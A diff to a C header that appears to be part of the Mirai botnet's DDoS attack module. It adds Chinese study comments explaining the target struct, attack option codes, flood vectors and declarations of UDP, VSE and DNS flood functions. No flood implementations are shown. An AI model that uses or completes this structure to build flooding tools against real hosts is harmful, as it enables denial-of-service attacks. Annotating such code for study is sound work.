@@ -17,12 +17,14 @@
 #define HTTP_CONNECTION_MAX     256
 #endif
 
+/*攻击目标的IP port netmask*/
 struct attack_target {
     struct sockaddr_in sock_addr;
     ipv4_t addr;
     uint8_t netmask;
 };
 
+/*攻击选项  一个键值对，按照key来取val*/
 struct attack_option {
     char *val;
     uint8_t key;
@@ -45,6 +47,7 @@ typedef uint8_t ATTACK_VECTOR;
 #define ATK_VEC_UDP_PLAIN  9  /* Plain UDP flood optimized for speed */
 #define ATK_VEC_HTTP       10 /* HTTP layer 7 flood */
 
+//攻击选项   
 #define ATK_OPT_PAYLOAD_SIZE    0   // What should the size of the packet data be?
 #define ATK_OPT_PAYLOAD_RAND    1   // Should we randomize the packet data contents?
 #define ATK_OPT_IP_TOS          2   // tos field in IP header
@@ -72,9 +75,11 @@ typedef uint8_t ATTACK_VECTOR;
 #define ATK_OPT_CONNS           24  // Number of sockets to use
 #define ATK_OPT_SOURCE          25  // Source IP
 
+
+/*攻击方式*/
 struct attack_method {
     ATTACK_FUNC func;
-    ATTACK_VECTOR vector;
+    ATTACK_VECTOR vector; //每个攻击有一个攻击编号  vector
 };
 
 struct attack_stomp_data {
@@ -152,7 +157,7 @@ char *attack_get_opt_str(uint8_t, struct attack_option *, uint8_t, char *);
 int attack_get_opt_int(uint8_t, struct attack_option *, uint8_t, int);
 uint32_t attack_get_opt_ip(uint8_t, struct attack_option *, uint8_t, uint32_t);
 
-/* Actual attacks */
+/* Actual attacks 具体的攻击方式*/
 void attack_udp_generic(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
 void attack_udp_vse(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
 void attack_udp_dns(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
